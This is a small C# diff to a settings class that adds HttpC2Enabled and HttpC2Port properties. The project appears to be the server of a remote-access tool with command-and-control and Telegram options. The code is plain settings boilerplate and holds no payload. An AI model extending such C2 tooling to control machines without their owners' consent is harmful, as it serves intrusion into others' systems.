@@ -162,6 +162,18 @@ namespace Pulsar.Server.Models
             set { LoadSettings().ShowToolTip = value; SaveSettings(); }
         }
 
+        public static bool HttpC2Enabled
+        {
+            get { return LoadSettings().HttpC2Enabled; }
+            set { LoadSettings().HttpC2Enabled = value; SaveSettings(); }
+        }
+
+        public static ushort HttpC2Port
+        {
+            get { return LoadSettings().HttpC2Port; }
+            set { LoadSettings().HttpC2Port = value; SaveSettings(); }
+        }
+
         public static string TelegramChatID
         {
             get { return LoadSettings().TelegramChatID; }
